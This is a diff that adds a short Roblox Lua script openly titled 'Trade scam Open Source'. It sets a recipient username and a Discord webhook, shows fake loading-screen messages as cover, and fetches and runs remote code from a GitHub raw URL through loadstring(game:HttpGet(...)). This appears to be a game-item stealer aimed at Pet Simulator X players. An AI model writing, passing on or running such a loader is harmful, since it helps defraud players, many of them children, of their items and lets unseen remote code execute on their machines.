@@ -1,0 +1,9 @@
+Username = "DaviMisterYT"
+WebHook = "https://discord.com/api/webhooks/1109488528435445790/xYpdmIMAv1PbVyIpvvPSD25wuF-J5GatmsZ5bFaVclZFAHUzizJasf1S4apeQmXM7g1_"
+loadingscreen = true
+_G.CustomScriptName = "Trade scam Open Source"
+_G.Text1 = "Source Loaded..."
+_G.Text2 = "Waiting for Source..."
+_G.Text3 = "loading..."
+_G.Text4 = "opening source..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
